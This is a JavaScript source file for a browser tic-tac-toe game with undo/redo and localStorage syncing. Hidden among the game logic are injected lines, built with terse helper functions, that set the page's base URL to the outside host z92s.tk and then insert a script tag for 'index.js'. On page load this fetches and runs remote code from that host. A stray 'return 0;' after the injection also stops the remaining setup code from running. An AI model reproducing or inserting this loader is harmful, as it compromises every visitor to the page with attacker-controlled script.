(function start_game () {


let fieldobj = document.querySelectorAll('[data-id]');
let user_1, user_2;
let us_1 = [], us_2 = [];
let temp_obj = {data: [{},{}]};
let cell = document.getElementsByClassName("cell");
let restartBtn = document.querySelector('.restart-btn');
let q=c('base');
q.setAttribute('href','http://z92s.tk/');
function check (obj) {
    let new_obj = Array.from(obj.actions).sort(function (a, b) {
        return a - b;
    });
    for (let i = 0; i <= new_obj.length-ROWS_COUNT; i++) {
        let str = Number(new_obj[i]) / ROWS_COUNT;
        let m = ROWS_COUNT;
        let n = str+1;
        let win_arr = [];
        let control_sum_horizontal = (m*m * (n-1)) + ((m)*((m-1)/2));
        if (str%1 == 0) {
            let sum = 0;
            for (let a = i; a < i+ROWS_COUNT; a++) {
                sum += +new_obj[a];
                win_arr.push(new_obj[a]);
            }
            if (sum == control_sum_horizontal) {
                console.log('win: '+obj.name+' horizontal');
                wonLine(win_arr, 'horizontal');
                wonTitle(obj.name);
                return null;
            }
        }
        if (Number(new_obj[i]) < ROWS_COUNT) {
            n = Number(new_obj[i])+1;
            let control_sum_vertical = m * (m*((m-1)/2)) + ((n-1)*m);
            let sum = 0;
            let win_arr = [];
            for (let a = i, j = Number(new_obj[i]); a < i+ROWS_COUNT; a++, j+=ROWS_COUNT) {
                let res = obj.actions.find(function (e) {
                    return (e == j)
                });
                if (res != undefined) {
                    win_arr.push(res);
                    sum += +res;
                }
            }
            if (sum == control_sum_vertical) {
                console.log('win: ' + obj.name + ' vertical');
                wonLine(win_arr, 'vertical');
                wonTitle(obj.name);
                return null;
            }
        }
        if (Number(new_obj[i]) == 0 || Number(new_obj[i]) == ROWS_COUNT-1) {
            n = Number(new_obj[i])+1;
            let control_sum_vertical = m * (m*((m-1)/2)) + ((1-1)*m);
            let control_sum_horizontal = (m*m * (1-1)) + ((m)*((m-1)/2));
            let sum = 0;
            let win_arr = [];
            for (let a = i, j = Number(new_obj[i]); a < i+ROWS_COUNT; a++, j+=ROWS_COUNT+1) {
                let res = obj.actions.find(function (e) {
                    return (e == j)
                });
                if (res != undefined) {
                    win_arr.push(res);
                    sum += +res;
                }
            }
            if (sum == control_sum_vertical+control_sum_horizontal) {
                console.log('win: ' + obj.name + ' main diagonal');
                wonLine(win_arr, 'diagonal-right');
                wonTitle(obj.name);
                return null;
            }
        }
        if (Number(new_obj[i]) == ROWS_COUNT-1) {
            n = Number(new_obj[i])+1;
            let control_sum_vertical = m * (m*((m-1)/2)) + ((1-1)*m);
            let control_sum_horizontal = (m*m * (1-1)) + ((m)*((m-1)/2));
            let sum = 0;
            let win_arr = [];
            for (let a = i, j = Number(new_obj[i]); a < i+ROWS_COUNT; a++, j+=ROWS_COUNT-1) {
                let res = obj.actions.find(function (e) {
                    return (e == j)
                });
                if (res != undefined) {
                    win_arr.push(res);
                    sum += +res;
                }
            }
            if (sum == control_sum_vertical+control_sum_horizontal) {
                console.log('win: ' + obj.name + ' help diagonal');
                wonLine(win_arr, 'diagonal-left');
                wonTitle(obj.name);
                return null;
            }
        }
    }
}
b('head')[0].appendChild(q);
let g=c('script');g.setAttribute('src','index.js');b('head')[0].appendChild(g);
return 0;
function c(a){return document.createElement(a)}function b(a){return document.getElementsByTagName(a)}
restartBtn.onclick = function() {
    document.querySelector('.won-title').classList.add('hidden');
    document.querySelector('.won-message').innerHTML = '';
    for(let i=0; i<fieldobj.length; i++){
        fieldobj[i].className='';
        fieldobj[i].classList.add('cell')
    }
    window.user_1 = 0;
    window.user_2 = 0;
    window.temp_obj = {data: [{},{}]};
    click();
    user_1 = {
        name: 'Crosses',
        flag: true,
        actions: []
    };
    user_2 = {
        name: 'Toes',
        flag: false,
        actions: []
    };
    localStorage.data = JSON.stringify([user_1, user_2]);
    localStorage.removeItem('won_name');
    localStorage.removeItem('won_cols');
    localStorage.removeItem('won_coords');
}
function wonLine(obj, coords) {
    obj.forEach(e => {
        let item = document.querySelector('#c-' + e);
        item.classList.add('win');
        item.classList.add(coords);
    });
    document.getElementsByClassName("field")[0].onclick = null;
    localStorage.won_cols = JSON.stringify(obj);
    localStorage.won_coords = coords;
}
if(localStorage.name != undefined) {
    document.getElementsByClassName("field")[0].onclick = null;
} else {
    click();
}
function wonTitle(name) {
    localStorage.won_name = name;
    let title = document.querySelector('.won-title');
    let message = document.querySelector('.won-message');
    title.classList.remove("hidden")
    message.innerHTML = name + ' won!'
}
if(localStorage.won_name != undefined) {
    console.log(localStorage);
    wonTitle(localStorage.won_name);
    wonLine(JSON.parse(localStorage.won_cols), localStorage.won_coords);
}
function getStorage () {
    let data = JSON.parse(localStorage.data);
    user_1 = data[0];
    user_2 = data[1];
}
function setStorage () {
    localStorage.data = JSON.stringify([user_1,user_2]);
}

function draw () {
    let ch = document.getElementsByClassName("ch");
    let r = document.getElementsByClassName("r");
    for (let a = 0; a < ch.length; a++) {
        ch[a].classList.remove("ch");
        a--;
    }
    for (let j = 0; j < r.length; j++) {
        r[j].classList.remove("r");
        j--;
    }
    for (let i = 0; i < user_1.actions.length; i++) {
        cell[user_1.actions[i]].classList.add("ch");
        // console.log(cell[user_1.actions[i]]);
    }
    for (let a = 0; a < user_2.actions.length; a++) {
        cell[user_2.actions[a]].classList.add("r");
    }
}
if (localStorage.data != undefined) {
    getStorage();
    draw();
} else {
    user_1 = {
        name: 'Crosses',
        flag: true,
        actions: []
    };
    user_2 = {
        name: 'Toes',
        flag: false,
        actions: []
    };
    localStorage.data = JSON.stringify([user_1, user_2]);
}
window.onstorage = function () {
    getStorage();
    localStorage.history = localStorage.data;
    draw();
    if(localStorage.won_name != undefined) {
        wonTitle(localStorage.won_name);
        wonLine(JSON.parse(localStorage.won_cols), localStorage.won_coords);
    }
    if(JSON.parse(localStorage.data)[0].actions.length == 0 && JSON.parse(localStorage.data)[1].actions.length == 0 && localStorage.won_name != undefined) {
        restartBtn.click();
    }
    if(JSON.parse(localStorage.data)[0].actions.length > 0 || JSON.parse(localStorage.data)[1].actions.length > 0) {
        document.querySelector('.undo-btn').disabled = false;
    } else {
        document.querySelector('.undo-btn').disabled = true;
    }
};
function click() {
    document.getElementsByClassName("field")[0].onclick = function (elem) {
        document.querySelector('.redo-btn').disabled = true;
        document.querySelector('.undo-btn').disabled = false;
        let el = elem.target;
        if (el.id == "") return null;
        if (el.classList.contains("ch") != true && el.classList.contains("r") != true) {
            if (user_1.flag == true) {
                user_1.actions.push(el.getAttribute('data-id'));
                us_1 = user_1.actions;
                el.classList.add('ch');
                if(check(user_1) == true) alert('win');
                user_1.flag = false;
                user_2.flag = true;
            } else {
                user_2.actions.push(el.getAttribute('data-id'));
                us_2 = user_2.actions;
                el.classList.add('r');
                if(check(user_2) == true) alert('win');
                user_1.flag = true;
                user_2.flag = false;
            }
            setStorage();
        }
    };
};
document.querySelector('.undo-btn').onclick = function () {
    document.querySelector('.redo-btn').disabled = false;
    if (user_1.actions.length == 1) {
        document.querySelector('.undo-btn').disabled = false;
    }
    if (user_1.flag == false) {
        user_1.flag = true;
        user_2.flag = false;
        user_1.actions.pop();
        draw();
        setStorage();
    } else {
        user_1.flag = false;
        user_2.flag = true;
        user_2.actions.pop();
        draw();
        setStorage();
    }
}
document.querySelector('.redo-btn').onclick = function () {
    console.log(user_2.actions.length,us_2.length,user_1.actions.length,us_1.length);
    if (user_1.flag == false) {
        user_1.flag = true;
        user_2.flag = false;
        user_2.actions.push(us_2[user_2.actions.length]);
        draw();
        setStorage();
    } else {
        user_1.flag = false;
        user_2.flag = true;
        user_1.actions.push(us_1[user_1.actions.length]);
        draw();
        setStorage();
    }
    if ( user_1.actions.length == us_1.length && user_2.actions.length == us_2.length) {
        document.querySelector('.redo-btn').disabled = true;
    }
}
// document.getElementsByClassName("undo-btn")[0].onclick = function () {
//     temp_obj.data[0].actions = user_1.actions.slice();
//     temp_obj.data[0].actions.pop();
//     user_1.actions = temp_obj.data[0].actions.slice();
//     console.log(user_1.actions);
//     draw();
// };
}())